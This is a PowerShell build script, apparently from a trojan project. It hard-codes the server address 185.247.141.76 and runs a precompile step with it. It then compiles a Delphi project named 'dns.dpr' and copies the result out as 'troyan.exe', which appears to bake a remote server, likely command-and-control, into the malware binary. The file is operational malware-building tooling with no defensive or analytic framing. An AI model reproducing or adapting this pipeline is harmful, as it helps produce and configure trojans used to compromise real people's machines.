param (
    [string]$serverName
)
$serverName="185.247.141.76"
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. .\current.ps1 -serverName $serverName
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$troyanDir = Resolve-Path -Path (Join-Path -Path $scriptDir -ChildPath "/troyan/troyandelphi")

Write-Host "scriptDir: $scriptDir"
Write-Host "currentDir: $currentDir"
Write-Host "scriptDir: $scriptDir"
Write-Host "serverFolder: $serverFolder"

$extensions = @(".dcu", ".res", ".exe")
foreach ($ext in $extensions) {
    Get-ChildItem -Path $troyanDir -Filter "*$ext" | Remove-Item -Force
}
Get-ChildItem -Path $troyanDir -Filter "_*" | Remove-Item -Force

& (Join-Path -Path $troyanDir -ChildPath "./precompile.ps1") -serverName $serverName

$dprFile = Join-Path -Path $troyanDir -ChildPath "dns.dpr"
Set-Location -Path (Split-Path -Path $dprFile -Parent)
& "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe" "$dprFile"
$exeFile = Join-Path -Path $troyanDir -ChildPath "dns.exe"
$currentExeFile = Join-Path -Path $dataDir -ChildPath "troyan.exe"
Copy-Item -Path $exeFile -Destination $currentExeFile -Force #>